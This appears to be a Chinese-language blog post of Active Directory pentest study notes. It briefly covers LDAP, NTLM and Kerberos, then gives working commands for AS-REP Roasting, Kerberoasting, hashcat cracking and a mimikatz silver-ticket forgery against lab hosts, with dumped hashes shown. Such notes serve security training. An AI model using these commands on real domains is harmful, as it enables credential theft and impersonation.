---
layout: post
title: "Windows AD"
date: 2025-02-18 00:00:00 +0800
author: [001]
categories: [Windows]
tags: [Windows]
--- 

# LDAP (Lightweight Directory Access Protocol, LDAP)

```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
port: 389、636
完整 LDAP 路徑需要三個參數：HostName、 PortNumber、DistinguishedName
HostName:電腦名稱、IP 位址或網域名稱
PortNumber:可選的
DistinguishedName(DN):DN 是唯一標識 AD 中物件的名稱，包括網域本身


# NTLM

NTLM 認證流程
假設 用戶 Alice 登入 Windows 伺服器：

例:用戶發起請求

Alice 嘗試存取 \\server\share 或登入系統。
伺服器發送 NTLM 挑戰

伺服器（或 DC）回應一個 隨機挑戰值（nonce）。
客戶端計算回應

Alice 的客戶端使用 NTLM 哈希值（基於密碼） 和伺服器提供的隨機數 加密計算回應（Response）。
伺服器驗證

伺服器（或 DC）使用用戶的 NTLM 哈希值 驗證回應是否正確。
若匹配，則通過身份驗證。

# Kerberos

* AS（Authentication Server）= 認證伺服器
* KDC（Key Distribution Center）= 金鑰分發中心
* TGT（Ticket Granting Ticket）= 票據授權票據，票據的票據
* TGS（Ticket Granting Server）= 票據授權伺服器
* SS（Service Server）= 特定服務提供端

# Kerberos常見攻擊手法
##  AS-REP Roasting

獲取Hash
 
impacket
```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

Rubeus
```
.\Rubeus.exe asreproast /nowrap
```

hashcat解密
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````

## Kerberoasting 
獲取hash

impacket

```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

Rubeus

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

hashcat解密
```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```



## 銀票

需要三個東西

* SPN password hash
* Target SPN


```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
```


* Domain SID
`whoami /all`


```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
成功會顯示`Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session`


利用票券瀏覽網頁
```
$response = Invoke-WebRequest -Uri "http://web04.corp.com/" -UseDefaultCredentials
$response.Content
```

or 

```
$response = iwr -UseDefaultCredentials http://web04
$response.Content
```



